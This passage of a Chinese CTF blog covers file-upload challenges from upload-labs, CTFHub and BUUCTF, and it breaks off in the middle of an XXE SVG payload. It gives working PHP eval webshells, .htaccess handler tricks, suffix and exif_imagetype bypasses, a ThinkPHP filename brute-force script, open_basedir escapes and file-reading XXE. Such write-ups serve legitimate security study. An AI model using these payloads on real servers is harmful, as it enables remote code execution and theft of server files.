<p>将后缀改为php3即可（还可以为php2，php4，php5，phtml）</p>
<h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>考察：后缀绕过</p>
<p>后缀设置了大量黑名单</p>
<p>将后缀改为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php. .</span><br></pre></td></tr></table></figure>
<p>由于值祛除了一次文件名末尾的点，然后再去除空格，因此. .可以实现过滤</p>
<h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>考察：后缀绕过</p>
<p>后缀改为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php . .</span><br></pre></td></tr></table></figure>
<h1 id="CTFHub"><a href="#CTFHub" class="headerlink" title="CTFHub"></a>CTFHub</h1><h2 id="无验证"><a href="#无验证" class="headerlink" title="无验证"></a>无验证</h2><p>直接上传，用antsword连接（菜刀被禁了）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;fca79403ea30c31b6413be65&#125;</span><br></pre></td></tr></table></figure>
<h2 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h2><p>取消前端js后，直接上传，用antsword连接</p>
<p>php文件无法下载，也不知道为什么</p>
<p>直接在页面执行命令，用cat查看flag文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;a849b8485adeaf5a66c6f477&#125;</span><br></pre></td></tr></table></figure>
<h2 id="MIME验证"><a href="#MIME验证" class="headerlink" title="MIME验证"></a>MIME验证</h2><p>将content-type修改为image/jpeg，其他操作与上面相同</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;5e9686dcfdf07612284fddae&#125;</span><br></pre></td></tr></table></figure>
<h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><p>.htaccess的格式为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1.jpg&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;    </span><br></pre></td></tr></table></figure>
<p>然后上传一个php文件，在burp中将文件名改为1.jpg</p>
<p>使用antsword连接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;6e504a1abc30e2ca266b7335&#125;</span><br></pre></td></tr></table></figure>
<h2 id="文件头检查"><a href="#文件头检查" class="headerlink" title="文件头检查"></a>文件头检查</h2><p>在文件内容前添加GIF89a</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;d.php&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;caa67ce803f60c6f9776b631&#125;</span><br></pre></td></tr></table></figure>
<h2 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h2><p>在URL处，修改URL为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;?road&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;1.php%00 HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>
<p>而用户名处，修改用户名为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.jpg</span><br></pre></td></tr></table></figure>
<p>注意，此处修改用户名为1.php%001.jpg，虽然能上传成功，但是无法用antsword连接（</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;8df08862cb34869e11b4cf33&#125;</span><br></pre></td></tr></table></figure>
<h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><p>将文件名修改为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.phphpp</span><br></pre></td></tr></table></figure>
<p>即可成功上传</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;7abd22955056b5d994fc2f14&#125;</span><br></pre></td></tr></table></figure>
<h1 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h1><h2 id="Upload-1"><a href="#Upload-1" class="headerlink" title="Upload"></a>Upload</h2><p>来源：极客大挑战2019</p>
<p>考察：&lt;?php的绕过、php后缀的绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;1.phtml&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt; @eval($_POST[&#39;cmd&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="Upload-2"><a href="#Upload-2" class="headerlink" title="Upload"></a>Upload</h2><p>来源：ACTF2020 新生赛</p>
<p>考察：phtml</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;upload_file&quot;; filename&#x3D;&quot;1.phtml&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
<h2 id="BabyUpload"><a href="#BabyUpload" class="headerlink" title="BabyUpload"></a>BabyUpload</h2><p>来源：GXYCTF2019</p>
<p>考察：.htaccess绕过</p>
<p>.htaccess</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;png&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>
<p>上传文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;uploaded&quot;; filename&#x3D;&quot;123.png&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&#39;php&#39;&gt; eval($_POST[&#39;cmd&#39;]); &lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="SimpleUpload"><a href="#SimpleUpload" class="headerlink" title="SimpleUpload"></a>SimpleUpload</h2><p>来源：RoarCTF2019</p>
<p>考察：条件竞合，thinkphp upload上传绕过，thinkphp uniqid生成文件名</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.chabug.org/audit/1035.html">https://www.chabug.org/audit/1035.html</a></p>
<p>爆破那部分没跑出来，太耗时间了</p>
<p>源码提示为thinkphp，且</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$upload-&gt;allowExts  &#x3D; array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);&#x2F;&#x2F; 设置附件上传类型</span><br></pre></td></tr></table></figure>
<p>一项有漏洞，此用法并不是thinkphp的正确用法，后缀名限制无效</p>
<p>而thinkphp中，upload函数不传参时为多文件上传，整个$_FILES数组都会保存</p>
<p>所以同时上传多个文件，可以绕过php后缀限制</p>
<p>thinkphp中使用uniqid进行重命名，可以使用上传两次空文件的方式，得到一个文件名区间，然后进行爆破</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">#&#123;&quot;url&quot;:&quot;\&#x2F;Public\&#x2F;Uploads\&#x2F;2019-10-12\&#x2F;5da1b52bb3645.txt&quot;,&quot;success&quot;:1&#125;</span><br><span class="line">#&#123;&quot;url&quot;:&quot;\&#x2F;Public\&#x2F;Uploads\&#x2F;&quot;,&quot;success&quot;:1&#125;</span><br><span class="line">#&#123;&quot;url&quot;:&quot;\&#x2F;Public\&#x2F;Uploads\&#x2F;2019-10-12\&#x2F;5da1b52bd6f0a.txt&quot;,&quot;success&quot;:1&#125;</span><br><span class="line"></span><br><span class="line">#&#123;&quot;url&quot;:&quot;\&#x2F;Public\&#x2F;Uploads\&#x2F;2020-07-22\&#x2F;5f17d4510999a.txt&quot;,&quot;success&quot;:1&#125;</span><br><span class="line">#&#123;&quot;url&quot;:&quot;\&#x2F;Public\&#x2F;Uploads\&#x2F;&quot;,&quot;success&quot;:1&#125;</span><br><span class="line">#&#123;&quot;url&quot;:&quot;\&#x2F;Public\&#x2F;Uploads\&#x2F;2020-07-22\&#x2F;5f17d4513d25f.txt&quot;,&quot;success&quot;:1&#125;</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;9d61cb9b-7e46-4f87-8a41-90375d25f991.node3.buuoj.cn&#x2F;index.php&#x2F;Home&#x2F;Index&#x2F;upload&#39;</span><br><span class="line">file1 &#x3D; &#123;&#39;file&#39;:open(&#39;8.txt&#39;,&#39;r&#39;)&#125;</span><br><span class="line">file2 &#x3D; &#123;&#39;file[]&#39;:open(&#39;8.php&#39;,&#39;r&#39;)&#125; #upload()不传参时即是批量上传所以用[]</span><br><span class="line">r &#x3D; requests.post(url,files &#x3D; file1)</span><br><span class="line">print( r.text)</span><br><span class="line">s1 &#x3D; r.text</span><br><span class="line">r &#x3D; requests.post(url,files &#x3D; file2)</span><br><span class="line">print( r.text)</span><br><span class="line">r &#x3D; requests.post(url, files &#x3D; file1)</span><br><span class="line">print( r.text)</span><br><span class="line">prefix &#x3D; r.text[38:47]</span><br><span class="line">print(prefix)</span><br><span class="line">s &#x3D; &quot;01234567890abcdef&quot;</span><br><span class="line">flag &#x3D; False</span><br><span class="line">for i in s:</span><br><span class="line">    if s.index(i) &lt; s.index(s1[39]):</span><br><span class="line">        continue</span><br><span class="line">    for j in s:</span><br><span class="line">        for x in s:</span><br><span class="line">            for y in s:</span><br><span class="line">            	for z in s:</span><br><span class="line">            		url &#x3D; &quot;http:&#x2F;&#x2F;9d61cb9b-7e46-4f87-8a41-90375d25f991.node3.buuoj.cn&#x2F;Public&#x2F;Uploads&#x2F;2021-02-24%s%s%s%s%s%s.php&quot;%(prefix,i,j,x,y,z)</span><br><span class="line">            		r &#x3D; requests.get(url)</span><br><span class="line">            		print(url)</span><br><span class="line">            		if r.status_code &#x3D;&#x3D; 429:</span><br><span class="line">            			time.sleep(0.1)</span><br><span class="line">            			continue</span><br><span class="line">            		if r.status_code &#x3D;&#x3D; 200:</span><br><span class="line">            			print(&quot;yes&quot;)</span><br><span class="line">            			flag &#x3D; True</span><br><span class="line">            			break</span><br><span class="line">            	if flag &#x3D;&#x3D; True:</span><br><span class="line">            		break</span><br><span class="line">            if flag &#x3D;&#x3D; True:</span><br><span class="line">            	break</span><br><span class="line">        if flag &#x3D;&#x3D; True:</span><br><span class="line">        	break</span><br><span class="line">    if flag &#x3D;&#x3D; True:</span><br><span class="line">    	break</span><br></pre></td></tr></table></figure>
<h3 id="thinkphp-upload上传绕过"><a href="#thinkphp-upload上传绕过" class="headerlink" title="thinkphp upload上传绕过"></a>thinkphp upload上传绕过</h3><h3 id="thinkphp-uniqid随机文件名生成爆破"><a href="#thinkphp-uniqid随机文件名生成爆破" class="headerlink" title="thinkphp uniqid随机文件名生成爆破"></a>thinkphp uniqid随机文件名生成爆破</h3><h2 id="Upload（未做）"><a href="#Upload（未做）" class="headerlink" title="Upload（未做）"></a>Upload（未做）</h2><p>来源：强网杯2019</p>
<h2 id="EasyWeb"><a href="#EasyWeb" class="headerlink" title="EasyWeb"></a>EasyWeb</h2><p>来源：SUCTF2019</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.yuque.com/jxswcy/buuoj-wp/grx27x?language=zh-cn%EF%BC%8Chttps://a16n.github.io/2020/10/26/SUCTF2019-EasyWeb/%EF%BC%8Chttps://www.cnblogs.com/hello-there/p/13039116.html">https://www.yuque.com/jxswcy/buuoj-wp/grx27x?language=zh-cn，https://a16n.github.io/2020/10/26/SUCTF2019-EasyWeb/，https://www.cnblogs.com/hello-there/p/13039116.html</a></p>
<p>考察：无字母数字webshell；.htaccess绕过；</p>
<p>题目给的源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    <span class="variable">$userdir</span> = <span class="string">&quot;upload/tmp_&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]); <span class="comment">// 目录</span></span><br><span class="line">    <span class="keyword">if</span>(!file_exists(<span class="variable">$userdir</span>))&#123;</span><br><span class="line">    mkdir(<span class="variable">$userdir</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        <span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable">$extension</span> = substr(<span class="variable">$name</span>, strrpos(<span class="variable">$name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/i&quot;</span>,<span class="variable">$extension</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);  <span class="comment"># 检测文件内部是否有ph字符</span></span><br><span class="line">    <span class="keyword">if</span>(mb_strpos(file_get_contents(<span class="variable">$tmp_name</span>), <span class="string">&#x27;&lt;?&#x27;</span>)!==<span class="literal">False</span>) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); <span class="comment"># 检测文件内部是否有&lt;?字符</span></span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype(<span class="variable">$tmp_name</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);  <span class="comment"># 判断是否为图片，故.htaccess前要加注释符</span></span><br><span class="line">        <span class="variable">$path</span>= <span class="variable">$userdir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$name</span>; <span class="comment"># 此处限定了只能在当前目录操作，因此需要绕过</span></span><br><span class="line">        @move_uploaded_file(<span class="variable">$tmp_name</span>, <span class="variable">$path</span>);</span><br><span class="line">        print_r(<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以下为第一段，通过提交_变量，调用get_the_flag函数</span></span><br><span class="line"><span class="comment"># 用脚本fuzz测试正则可以使用的字符</span></span><br><span class="line"><span class="comment"># 用剩余字符，进行异或运算，得到</span></span><br><span class="line"><span class="variable">$hhh</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$hhh</span>)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$hhh</span>)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="variable">$hhh</span>) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$character_type</span> = count_chars(<span class="variable">$hhh</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$character_type</span>)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$hhh</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>_变量，通过异或进行运算得出</p>
<p>.htaccess</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337                          # Define the width wanted by the code (and say we are a legit xbitmap file lol)</span><br><span class="line">#define height 1337                         # Define the height</span><br><span class="line"></span><br><span class="line">AddType application&#x2F;x-httpd-php .xxx         # Say all file with extension .php16 will execute php</span><br><span class="line"></span><br><span class="line">php_value zend.multibyte 1                  # Active specific encoding (you will see why after :D)</span><br><span class="line">php_value zend.detect_unicode 1             # Detect if the file have unicode content</span><br><span class="line">php_value display_errors 1                  # Display php errors</span><br></pre></td></tr></table></figure>
<p>带base64自动解码版本的.htaccess</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br><span class="line"></span><br><span class="line">AddType application&#x2F;x-httpd-php .ha</span><br><span class="line">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;tmp_adeee0c170ad4ffb110df0cde294aecd&#x2F;shell.ha</span><br></pre></td></tr></table></figure>


<p>此处为何.htaccess可以绕过exif_imagetype，参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/tr1ple/p/11207145.html#jCmcxrz8">https://www.cnblogs.com/tr1ple/p/11207145.html#jCmcxrz8</a></p>
<p>简单的来说，利用了XBM，一样重纯文本二进制图像格式。通过开头的#define，既确定了宽度和高度，也标识这是一个xbm文件。且这种标识在.htaccess中被视为注释（#是注释符）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">SIZE_HEADER = <span class="string">b&quot;\n\n#define width 1337\n#define height 1337\n\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_php_file</span>(<span class="params">filename, script</span>):</span></span><br><span class="line">    phpfile = <span class="built_in">open</span>(filename, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    phpfile.write(script.encode(<span class="string">&#x27;utf-16be&#x27;</span>))</span><br><span class="line">    phpfile.write(SIZE_HEADER)</span><br><span class="line"></span><br><span class="line">    phpfile.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_htacess</span>():</span></span><br><span class="line">    htaccess = <span class="built_in">open</span>(<span class="string">&#x27;.htaccess&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    htaccess.write(SIZE_HEADER)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;AddType application/x-httpd-php .xxx\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value zend.multibyte 1\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value zend.detect_unicode 1\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value display_errors 1\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    htaccess.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>():</span></span><br><span class="line">    url=<span class="string">&#x27;http://cdae37cf-9516-4e37-b27a-61fba50f0d80.node3.buuoj.cn/?_=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe=get_the_flag&#x27;</span></span><br><span class="line">    filename=[<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;1.xxx&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> filename:</span><br><span class="line">        file=&#123;<span class="string">&quot;file&quot;</span>:<span class="built_in">open</span>(x,<span class="string">&quot;rb&quot;</span>)&#125;</span><br><span class="line">        req = requests.post(url=url, files=file)</span><br><span class="line">        print(req.content)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    generate_htacess()</span><br><span class="line">    print(<span class="string">&quot;debug1&quot;</span>)</span><br><span class="line">    generate_php_file(<span class="string">&quot;1.xxx&quot;</span>, <span class="string">&quot;&lt;?php eval($_GET[&#x27;cmd&#x27;]); die(); ?&gt;&quot;</span>) <span class="comment"># 此处好像有些许问题，&lt;?和ph应该都被过滤了，需要使用base64上传，并在.htaccess中设置自动baset64解码</span></span><br><span class="line">    print(<span class="string">&quot;debug2&quot;</span>)</span><br><span class="line">    upload()</span><br></pre></td></tr></table></figure>
<p>尝试用蚁剑连接，提示无权访问</p>
<p>在phpinfo中可以看到，open_basedir的存在</p>
<p>尝试bypass open_basedir</p>
<p>绕过disable_function</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd&#x3D;chdir(%27tmp%27);ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27&#x2F;%27);readfile(%22&#x2F;THis_Is_tHe_F14g%22);</span><br></pre></td></tr></table></figure>
<p>或者利用蚁剑的disable_functions插件</p>
<h3 id="init-set绕过open-basedir"><a href="#init-set绕过open-basedir" class="headerlink" title="init_set绕过open_basedir"></a>init_set绕过open_basedir</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);echo(file_get_contents(&#39;flag&#39;));</span><br></pre></td></tr></table></figure>
<h3 id="htaccess自解码base64"><a href="#htaccess自解码base64" class="headerlink" title=".htaccess自解码base64"></a>.htaccess自解码base64</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;tmp_adeee0c170ad4ffb110df0cde294aecd&#x2F;shell.ha</span><br></pre></td></tr></table></figure>
<h3 id="htaccess绕过exif-imagetype"><a href="#htaccess绕过exif-imagetype" class="headerlink" title=".htaccess绕过exif_imagetype"></a>.htaccess绕过exif_imagetype</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337                          # Define the width wanted by the code (and say we are a legit xbitmap file lol)</span><br><span class="line">#define height 1337                         # Define the height</span><br><span class="line"></span><br><span class="line">AddType application&#x2F;x-httpd-php .xxx         # Say all file with extension .php16 will execute php</span><br><span class="line"></span><br><span class="line">php_value zend.multibyte 1                  # Active specific encoding (you will see why after :D)</span><br><span class="line">php_value zend.detect_unicode 1             # Detect if the file have unicode content</span><br><span class="line">php_value display_errors 1                  # Display php errors</span><br></pre></td></tr></table></figure>


<h2 id="SVGMagic"><a href="#SVGMagic" class="headerlink" title="SVGMagic"></a>SVGMagic</h2><p>来源：BSidesCF2019</p>
<p>考察：SVG，XXE</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;svgfile&quot;; filename&#x3D;&quot;1.svg&quot;</span><br><span class="line">Content-Type: image&#x2F;svf+xml</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;flag.txt&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;svg height&#x3D;&quot;100&quot; width&#x3D;&quot;1000&quot;&gt;</span><br><span class="line">  &lt;text x&#x3D;&quot;10&quot; y&#x3D;&quot;20&quot;&gt;&amp;file;&lt;&#x2F;text&gt;</span><br><span 